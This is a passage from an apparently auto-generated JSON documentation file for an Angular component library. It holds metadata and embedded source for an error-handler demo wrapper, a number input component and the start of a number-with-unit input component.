            "sourceCode": "import { Component, Injectable, NgModule } from '@angular/core';\nimport { HttpClient, HttpClientModule, HttpErrorResponse } from '@angular/common/http';\nimport { CommonModule } from '@angular/common';\nimport { MatButtonModule } from '@angular/material/button';\nimport {\n  CUSTOM_ERROR_HANDLER, ERROR_LOGGER,\n  ErrorHandlerService,\n  Handler,\n  HttpError,\n  StoErrorHandler\n} from '@ngx-stoui/error-handler';\n\n@Component({\n  selector: 'next-wrapper',\n  template: `\n    <button mat-button\n            (click)=\"overRide(404)\">Overridden 404\n    </button>\n    <button mat-button\n            (click)=\"showError(s)\"\n            *ngFor=\"let s of errors\">{{s}} {{ s === 401 ? '(App Override)' : ''}}</button>\n  `,\n  providers: []\n})\nexport class NextWrapperComponent {\n  public errors = [\n    0,\n    400,\n    401,\n    403,\n    404,\n    409,\n    500,\n    501,\n    503\n  ];\n\n  constructor(private service: ErrorHandlerService) {\n  }\n\n  showError(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    this.service.handler(err);\n  }\n\n  overRide(status: number) {\n    const err = new HttpErrorResponse({\n      status,\n      error: {\n        message: 'server error message'\n      },\n      statusText: 'Error',\n      url: 'http://errorhandler/api'\n    });\n    const handler = function (err: HttpErrorResponse) {\n      const e = new HttpError(err);\n      e.title = 'Local override 404';\n      e.text = 'Local override not found item';\n      return e;\n    };\n    this.service.handler(err, handler);\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class ErrorHandlerImpl implements StoErrorHandler {\n  [ code: number ]: Handler;\n\n  401(err: HttpErrorResponse) {\n    const error = new HttpError(err);\n    error.title = 'Custom not signed in';\n    error.text = 'Custom not signed in text';\n    return error;\n  }\n}\n\n@Injectable({\n  providedIn: 'root'\n})\nexport class Logger {\n  constructor(private http: HttpClient) {\n  }\n\n  log(err: HttpError) {\n    // This method will typically go to the application backend or a central log repository\n    console.log('Error', err);\n  }\n}\n\nfunction LoggerFactory(http: HttpClient) {\n  return new Logger(http);\n}\n\n@NgModule({\n  declarations: [ NextWrapperComponent ],\n  imports: [ CommonModule, MatButtonModule, HttpClientModule ],\n  exports: [ NextWrapperComponent ],\n  providers: [\n    { provide: CUSTOM_ERROR_HANDLER, useClass: ErrorHandlerImpl },\n    { provide: ERROR_LOGGER, useFactory: LoggerFactory, deps: [ HttpClient ] }\n  ]\n})\nexport class WrapperModule {\n}\n\n",
            "assetsDirs": [],
            "styleUrlsData": "",
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "service",
                        "type": "ErrorHandlerService"
                    }
                ],
                "line": 36,
                "jsdoctags": [
                    {
                        "name": "service",
                        "type": "ErrorHandlerService",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            }
        },
        {
            "name": "NumberInputComponent",
            "id": "component-NumberInputComponent-0bb23a3af6ae7c2b04af73d3082b170f",
            "file": "libs/form/src/lib/number-input/number-input/number-input.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [
                {
                    "name": "{ provide: MatFormFieldControl, useExisting: NumberInputComponent }",
                    "type": "component"
                }
            ],
            "selector": "sto-number-input",
            "styleUrls": [
                "./number-input.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./number-input.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "disabled",
                    "line": 87,
                    "type": "boolean"
                },
                {
                    "name": "dynamicFractionSize",
                    "line": 58,
                    "type": "boolean"
                },
                {
                    "name": "fractionSize",
                    "line": 113
                },
                {
                    "name": "placeholder",
                    "line": 134
                },
                {
                    "name": "readonly",
                    "line": 101,
                    "type": "boolean"
                },
                {
                    "name": "required",
                    "line": 158
                },
                {
                    "name": "tabIndex",
                    "line": 146
                },
                {
                    "name": "value",
                    "line": 170
                }
            ],
            "outputsClass": [
                {
                    "name": "ngModelChange",
                    "defaultValue": "new EventEmitter<number | null>()",
                    "line": 84,
                    "type": "EventEmitter"
                }
            ],
            "propertiesClass": [
                {
                    "name": "_disabled",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 98,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_fractionSize",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 126,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_placeholder",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 143,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_readonly",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 110,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_required",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 167,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_tabIndex",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 155,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_value",
                    "type": "number | null",
                    "optional": false,
                    "description": "",
                    "line": 184,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "autofilled",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 53
                },
                {
                    "name": "controlType",
                    "defaultValue": "'number-input'",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 54
                },
                {
                    "name": "ctrl",
                    "defaultValue": "new FormControl()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 55
                },
                {
                    "name": "errorState",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 70
                },
                {
                    "name": "focused",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 52
                },
                {
                    "name": "nextId",
                    "defaultValue": "0",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 49,
                    "modifierKind": [
                        115
                    ]
                },
                {
                    "name": "ngControl",
                    "type": "NgControl",
                    "optional": false,
                    "description": "",
                    "line": 186,
                    "decorators": [
                        {
                            "name": "Optional",
                            "stringifiedArguments": ""
                        },
                        {
                            "name": "Self",
                            "stringifiedArguments": ""
                        }
                    ],
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "numberFormatter",
                    "defaultValue": "new NumberInputPipe()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 51,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "onChange",
                    "defaultValue": "() => {...}",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 242
                },
                {
                    "name": "onTouched",
                    "defaultValue": "() => {...}",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 245
                },
                {
                    "name": "stateChanges",
                    "defaultValue": "new Subject<void>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 50
                },
                {
                    "name": "sub",
                    "defaultValue": "new Subscription()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 56,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "_defaultErrorStateMatcher",
                    "type": "ErrorStateMatcher",
                    "optional": false,
                    "description": "",
                    "line": 19,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "_elementRef",
                    "type": "ElementRef",
                    "optional": false,
                    "description": "",
                    "line": 18,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "_parentForm",
                    "type": "NgForm",
                    "optional": false,
                    "description": "",
                    "line": 20,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "_parentFormGroup",
                    "type": "FormGroupDirective",
                    "optional": false,
                    "description": "",
                    "line": 21,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "errorState",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "<p>Whether the component is in an error state. </p>\n",
                    "line": 8,
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "errorStateMatcher",
                    "type": "ErrorStateMatcher",
                    "optional": false,
                    "description": "",
                    "line": 16,
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "ngControl",
                    "type": "NgControl",
                    "optional": false,
                    "description": "",
                    "line": 22,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "stateChanges",
                    "type": "Subject<void>",
                    "optional": false,
                    "description": "<p>Stream that emits whenever the state of the input changes such that the wrapping\n<code>MatFormField</code> needs to run change detection.</p>\n",
                    "line": 14,
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                }
            ],
            "methodsClass": [
                {
                    "name": "matOnTouched",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 248
                },
                {
                    "name": "ngDoCheck",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 202
                },
                {
                    "name": "ngOnDestroy",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 226
                },
                {
                    "name": "ngOnInit",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 208
                },
                {
                    "name": "onContainerClick",
                    "args": [
                        {
                            "name": "event",
                            "type": "MouseEvent"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 233,
                    "jsdoctags": [
                        {
                            "name": "event",
                            "type": "MouseEvent",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "registerOnChange",
                    "args": [
                        {
                            "name": "fn",
                            "type": "never"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 256,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "never",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "registerOnTouched",
                    "args": [
                        {
                            "name": "fn",
                            "type": "never"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 260,
                    "jsdoctags": [
                        {
                            "name": "fn",
                            "type": "never",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setDescribedByIds",
                    "args": [
                        {
                            "name": "ids",
                            "type": "string[]"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 237,
                    "jsdoctags": [
                        {
                            "name": "ids",
                            "type": "string[]",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "setDisabledState",
                    "args": [
                        {
                            "name": "isDisabled",
                            "type": "boolean"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 264,
                    "jsdoctags": [
                        {
                            "name": "isDisabled",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "writeValue",
                    "args": [
                        {
                            "name": "value",
                            "type": "number"
                        }
                    ],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 252,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "updateErrorState",
                    "args": [],
                    "optional": false,
                    "returnType": "void",
                    "typeParameters": [],
                    "line": 25,
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                }
            ],
            "hostBindings": [
                {
                    "name": "attr.aria-describedby",
                    "defaultValue": "''",
                    "line": 68
                },
                {
                    "name": "class.floating",
                    "line": 61
                },
                {
                    "name": "id",
                    "defaultValue": "`value-unit-input-${NumberInputComponent.nextId++}`",
                    "line": 66
                }
            ],
            "hostListeners": [],
            "description": "",
            "rawdescription": "",
            "type": "component",
            "sourceCode": "import {\n  ChangeDetectionStrategy,\n  Component,\n  DoCheck,\n  ElementRef,\n  EventEmitter,\n  HostBinding,\n  Input,\n  OnDestroy,\n  OnInit,\n  Optional,\n  Output,\n  Self,\n  ViewEncapsulation\n} from '@angular/core';\nimport { ControlValueAccessor, FormControl, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\nimport { MatFormFieldControl } from '@angular/material/form-field';\nimport { Subject, Subscription } from 'rxjs';\nimport { FocusMonitor } from '@angular/cdk/a11y';\nimport { NumberInputPipe } from '../number-input.pipe';\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\nimport { startWith } from 'rxjs/operators';\nimport { ErrorStateMatcher } from '@angular/material/core';\nimport { FormFieldBase } from '../../sto-form/form-field.base';\n\n/*\nclass NumberInputBase {\n  constructor(public _elementRef: ElementRef,\n              public _defaultErrorStateMatcher: ErrorStateMatcher,\n              public _parentForm: NgForm,\n              public _parentFormGroup: FormGroupDirective,\n              public ngControl: NgControl) {}\n}\nconst _NumberInputBase: CanUpdateErrorStateCtor = mixinErrorState(NumberInputBase.constructor);\n*/\n\n\n@Component({\n  selector: 'sto-number-input',\n  templateUrl: './number-input.component.html',\n  styleUrls: [ './number-input.component.scss' ],\n  encapsulation: ViewEncapsulation.None,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  providers: [\n    { provide: MatFormFieldControl, useExisting: NumberInputComponent }\n  ]\n})\nexport class NumberInputComponent extends FormFieldBase implements DoCheck, OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<number> {\n  static nextId = 0;\n  stateChanges = new Subject<void>();\n  private numberFormatter = new NumberInputPipe();\n  focused: boolean;\n  autofilled: boolean;\n  controlType = 'number-input';\n  ctrl = new FormControl();\n  public sub = new Subscription();\n  @Input()\n  dynamicFractionSize: boolean;\n\n  @HostBinding('class.floating')\n  get shouldLabelFloat() {\n    return this.focused || !this.empty;\n  }\n\n  @HostBinding()\n  id = `value-unit-input-${NumberInputComponent.nextId++}`;\n  @HostBinding('attr.aria-describedby')\n  describedBy = '';\n\n  errorState: boolean;\n\n  /*  get errorState() {\n      return this._errorState && (this.ngControl ? this.ngControl.touched : false);\n    }\n\n    set errorState(errorState) {\n      this._errorState = errorState;\n      this.stateChanges.next();\n    }\n\n    private _errorState: boolean;*/\n\n  @Output()\n  ngModelChange = new EventEmitter<number | null>();\n\n  @Input()\n  get disabled(): boolean {\n    return this._disabled;\n  }\n\n  set disabled(value: boolean) {\n    this._disabled = coerceBooleanProperty(value);\n    const opts = { onlySelf: true, emitEvent: false };\n    this._disabled ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\n    this.stateChanges.next();\n  }\n\n  private _disabled = false;\n\n  @Input()\n  get readonly(): boolean {\n    return this._readonly;\n  }\n\n  set readonly(value: boolean) {\n    this._readonly = coerceBooleanProperty(value);\n    this.stateChanges.next();\n  }\n\n  private _readonly = false;\n\n  @Input()\n  get fractionSize() {\n    return this._fractionSize;\n  }\n\n  set fractionSize(fractionSize) {\n    if ( !fractionSize && fractionSize !== 0 ) {\n      fractionSize = 3;\n    }\n    this._fractionSize = fractionSize;\n    this.value = this._value;\n    this.stateChanges.next();\n  }\n\n  private _fractionSize: number;\n\n  get empty() {\n    const value = this.ctrl.value;\n    return !( value && value !== 0 );\n  }\n\n  @Input()\n  get placeholder() {\n    return this._placeholder || '';\n  }\n\n  set placeholder(plh) {\n    this._placeholder = plh;\n    this.stateChanges.next();\n  }\n\n  private _placeholder: string;\n\n  @Input()\n  get tabIndex() {\n    return this._tabIndex;\n  }\n\n  set tabIndex(tabIndex) {\n    this._tabIndex = tabIndex;\n    this.stateChanges.next();\n  }\n\n  private _tabIndex: number;\n\n  @Input()\n  get required() {\n    return this._required;\n  }\n\n  set required(req) {\n    this._required = coerceBooleanProperty(req);\n    this.stateChanges.next();\n  }\n\n  private _required = false;\n\n  @Input()\n  get value() {\n    return this._value;\n  }\n\n  set value(value) {\n    if (!value && value !== 0) {\n      return;\n    }\n    this._value = value;\n    const valueAsString = this.numberFormatter.transform(value, this.fractionSize, this.dynamicFractionSize);\n    this.ctrl.setValue(valueAsString, { emitEvent: false });\n    this.stateChanges.next();\n  }\n\n  private _value: number | null;\n\n  constructor(@Optional() @Self() public ngControl: NgControl,\n              private fm: FocusMonitor,\n              @Optional() _parentForm: NgForm,\n              @Optional() _parentFormGroup: FormGroupDirective,\n              _defaultErrorStateMatcher: ErrorStateMatcher,\n              private elRef: ElementRef<HTMLElement>) {\n    super(elRef, _defaultErrorStateMatcher, _parentForm, _parentFormGroup, ngControl);\n    if ( this.ngControl != null ) {\n      this.ngControl.valueAccessor = this;\n    }\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\n      this.focused = !!origin;\n      this.stateChanges.next();\n    });\n  }\n\n  ngDoCheck(): void {\n    if ( this.ngControl ) {\n      this.updateErrorState();\n    }\n  }\n\n  ngOnInit(): void {\n    const sub = this.ctrl.valueChanges\n      .subscribe((value: string) => {\n        let numericValue: null | number = parseFloat(this.numberFormatter.parse(value, this.fractionSize, this.dynamicFractionSize));\n        numericValue = isNaN(numericValue) ? null : numericValue;\n        this.onChange(numericValue);\n        this.ngModelChange.emit(numericValue);\n      });\n    this.sub.add(sub);\n    if ( this.ngControl && this.ngControl.statusChanges ) {\n      this.sub.add(this.ngControl.statusChanges\n        .pipe(startWith(this.ngControl.status))\n        .subscribe(() => {\n          this.updateErrorState();\n        }));\n    }\n  }\n\n  ngOnDestroy(): void {\n    this.stateChanges.complete();\n    this.fm.stopMonitoring(this.elRef.nativeElement);\n    this.sub.unsubscribe();\n  }\n\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\n  onContainerClick(event: MouseEvent): void {\n    this.elRef.nativeElement.querySelector('input')?.focus();\n  }\n\n  setDescribedByIds(ids: string[]): void {\n    this.describedBy = ids.join(' ');\n  }\n\n  // eslint-disable-next-line\n  onChange = (_: any) => {\n  }\n  // eslint-disable-next-line\n  onTouched = () => {\n  }\n\n  matOnTouched() {\n    this.stateChanges.next();\n  }\n\n  writeValue(value: number): void {\n    this.value = value;\n  }\n\n  registerOnChange(fn: never): void {\n    this.onChange = fn;\n  }\n\n  registerOnTouched(fn: never): void {\n    this.onTouched = fn;\n  }\n\n  setDisabledState(isDisabled: boolean): void {\n    this.disabled = isDisabled;\n  }\n\n\n}\n",
            "assetsDirs": [],
            "styleUrlsData": [
                {
                    "data": ".mat-form-field.sto-form__field {\n  .sto-number-input {\n    border: none;\n    width: 100%;\n    background: none;\n    padding: 0;\n    outline: none;\n    font: inherit;\n  }\n}\n\n",
                    "styleUrl": "./number-input.component.scss"
                }
            ],
            "stylesData": "",
            "constructorObj": {
                "name": "constructor",
                "description": "",
                "args": [
                    {
                        "name": "ngControl",
                        "type": "NgControl"
                    },
                    {
                        "name": "fm",
                        "type": "FocusMonitor"
                    },
                    {
                        "name": "_parentForm",
                        "type": "NgForm"
                    },
                    {
                        "name": "_parentFormGroup",
                        "type": "FormGroupDirective"
                    },
                    {
                        "name": "_defaultErrorStateMatcher",
                        "type": "ErrorStateMatcher"
                    },
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>"
                    }
                ],
                "line": 184,
                "jsdoctags": [
                    {
                        "name": "ngControl",
                        "type": "NgControl",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "fm",
                        "type": "FocusMonitor",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "_parentForm",
                        "type": "NgForm",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "_parentFormGroup",
                        "type": "FormGroupDirective",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "_defaultErrorStateMatcher",
                        "type": "ErrorStateMatcher",
                        "tagName": {
                            "text": "param"
                        }
                    },
                    {
                        "name": "elRef",
                        "type": "ElementRef<HTMLElement>",
                        "tagName": {
                            "text": "param"
                        }
                    }
                ]
            },
            "extends": "FormFieldBase",
            "implements": [
                "DoCheck",
                "OnInit",
                "OnDestroy",
                "ControlValueAccessor",
                "MatFormFieldControl"
            ],
            "accessors": {
                "disabled": {
                    "name": "disabled",
                    "setSignature": {
                        "name": "disabled",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": "boolean"
                            }
                        ],
                        "returnType": "void",
                        "line": 91,
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "boolean",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "readonly": {
                    "name": "readonly",
                    "setSignature": {
                        "name": "readonly",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": "boolean"
                            }
                        ],
                        "returnType": "void",
                        "line": 105,
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "boolean",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "fractionSize": {
                    "name": "fractionSize",
                    "setSignature": {
                        "name": "fractionSize",
                        "type": "void",
                        "args": [
                            {
                                "name": "fractionSize",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 117,
                        "jsdoctags": [
                            {
                                "name": "fractionSize",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "empty": {
                    "name": "empty",
                    "getSignature": {
                        "name": "empty",
                        "type": "",
                        "returnType": "",
                        "line": 128
                    }
                },
                "placeholder": {
                    "name": "placeholder",
                    "setSignature": {
                        "name": "placeholder",
                        "type": "void",
                        "args": [
                            {
                                "name": "plh",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 138,
                        "jsdoctags": [
                            {
                                "name": "plh",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "tabIndex": {
                    "name": "tabIndex",
                    "setSignature": {
                        "name": "tabIndex",
                        "type": "void",
                        "args": [
                            {
                                "name": "tabIndex",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 150,
                        "jsdoctags": [
                            {
                                "name": "tabIndex",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "required": {
                    "name": "required",
                    "setSignature": {
                        "name": "required",
                        "type": "void",
                        "args": [
                            {
                                "name": "req",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 162,
                        "jsdoctags": [
                            {
                                "name": "req",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                },
                "value": {
                    "name": "value",
                    "setSignature": {
                        "name": "value",
                        "type": "void",
                        "args": [
                            {
                                "name": "value",
                                "type": ""
                            }
                        ],
                        "returnType": "void",
                        "line": 174,
                        "jsdoctags": [
                            {
                                "name": "value",
                                "type": "",
                                "tagName": {
                                    "text": "param"
                                }
                            }
                        ]
                    }
                }
            },
            "templateData": "<input numberInput\n       class=\"sto-number-input\"\n       (blur)=\"onTouched()\"\n       [fractionSize]=\"fractionSize\"\n       [dynamicFractionSize]=\"dynamicFractionSize\"\n       [placeholder]=\"placeholder\"\n       [readonly]=\"readonly\"\n       [tabindex]=\"readonly ? -1 : (tabIndex || 0)\"\n       type=\"text\"\n       [formControl]=\"ctrl\">\n<div>\n  <ng-content select=\"mat-option\"></ng-content>\n</div>\n"
        },
        {
            "name": "NumberUnitInputComponent",
            "id": "component-NumberUnitInputComponent-47aa7305a547713aa580072f6ca10a4f",
            "file": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
            "changeDetection": "ChangeDetectionStrategy.OnPush",
            "encapsulation": [
                "ViewEncapsulation.None"
            ],
            "entryComponents": [],
            "inputs": [],
            "outputs": [],
            "providers": [
                {
                    "name": "{ provide: MatFormFieldControl, useExisting: NumberUnitInputComponent }",
                    "type": "component"
                }
            ],
            "selector": "sto-number-unit-input",
            "styleUrls": [
                "./number-unit-input.component.scss"
            ],
            "styles": [],
            "templateUrl": [
                "./number-unit-input.component.html"
            ],
            "viewProviders": [],
            "inputsClass": [
                {
                    "name": "disabled",
                    "line": 61,
                    "type": "boolean"
                },
                {
                    "name": "fractionSize",
                    "line": 103
                },
                {
                    "name": "list",
                    "line": 91
                },
                {
                    "name": "placeholder",
                    "line": 126
                },
                {
                    "name": "readonly",
                    "line": 77,
                    "type": "boolean"
                },
                {
                    "name": "required",
                    "line": 150
                },
                {
                    "name": "unitClearText",
                    "defaultValue": "'(none)'",
                    "line": 58
                },
                {
                    "name": "unitOptional",
                    "defaultValue": "true",
                    "line": 56
                },
                {
                    "name": "unitPlaceholder",
                    "line": 138
                }
            ],
            "outputsClass": [],
            "propertiesClass": [
                {
                    "name": "_disabled",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 74,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_fractionSize",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 112,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_list",
                    "defaultValue": "[]",
                    "type": "literal type[]",
                    "optional": false,
                    "description": "",
                    "line": 100,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_placeholder",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 135,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_readonly",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 88,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_required",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 159,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_unitPlaceholder",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 147,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "_value",
                    "type": "NumberUnit | null",
                    "optional": false,
                    "description": "",
                    "line": 181,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "autofilled",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 45,
                    "modifierKind": [
                        132
                    ]
                },
                {
                    "name": "controlType",
                    "defaultValue": "'number-unit-input'",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 46
                },
                {
                    "name": "errorState",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 53
                },
                {
                    "name": "focused",
                    "type": "boolean",
                    "optional": false,
                    "description": "",
                    "line": 119,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "form",
                    "type": "FormGroup",
                    "optional": false,
                    "description": "",
                    "line": 44,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "input",
                    "type": "ElementRef<HTMLInputElement>",
                    "optional": false,
                    "description": "",
                    "line": 51,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "'input'"
                        }
                    ]
                },
                {
                    "name": "nextId",
                    "defaultValue": "0",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 42,
                    "modifierKind": [
                        115
                    ]
                },
                {
                    "name": "ngControl",
                    "type": "NgControl",
                    "optional": false,
                    "description": "",
                    "line": 188,
                    "decorators": [
                        {
                            "name": "Optional",
                            "stringifiedArguments": ""
                        },
                        {
                            "name": "Self",
                            "stringifiedArguments": ""
                        }
                    ],
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "numberFormatterPipe",
                    "defaultValue": "new NumberInputPipe()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 47,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "onChange",
                    "defaultValue": "() => {...}",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 258
                },
                {
                    "name": "onTouched",
                    "defaultValue": "() => {...}",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 261
                },
                {
                    "name": "select",
                    "type": "MatSelect",
                    "optional": false,
                    "description": "",
                    "line": 49,
                    "decorators": [
                        {
                            "name": "ViewChild",
                            "stringifiedArguments": "MatSelect"
                        }
                    ]
                },
                {
                    "name": "stateChanges",
                    "defaultValue": "new Subject<void>()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 43
                },
                {
                    "name": "sub",
                    "defaultValue": "new Subscription()",
                    "type": "",
                    "optional": false,
                    "description": "",
                    "line": 185,
                    "modifierKind": [
                        114
                    ]
                },
                {
                    "name": "_defaultErrorStateMatcher",
                    "type": "ErrorStateMatcher",
                    "optional": false,
                    "description": "",
                    "line": 19,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "_elementRef",
                    "type": "ElementRef",
                    "optional": false,
                    "description": "",
                    "line": 18,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "_parentForm",
                    "type": "NgForm",
                    "optional": false,
                    "description": "",
                    "line": 20,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "_parentFormGroup",
                    "type": "FormGroupDirective",
                    "optional": false,
                    "description": "",
                    "line": 21,
                    "modifierKind": [
                        114
                    ],
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "errorState",
                    "defaultValue": "false",
                    "type": "",
                    "optional": false,
                    "description": "<p>Whether the component is in an error state. </p>\n",
                    "line": 8,
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "errorStateMatcher",
                    "type": "ErrorStateMatcher",
                    "optional": false,
                    "description": "",
                    "line": 16,
                    "inheritance": {
                        "file": "FormFieldBase"
                    }
                },
                {
                    "name": "ngControl",
                    "type": "NgControl",
                    "optional": false,
                    "description": "",
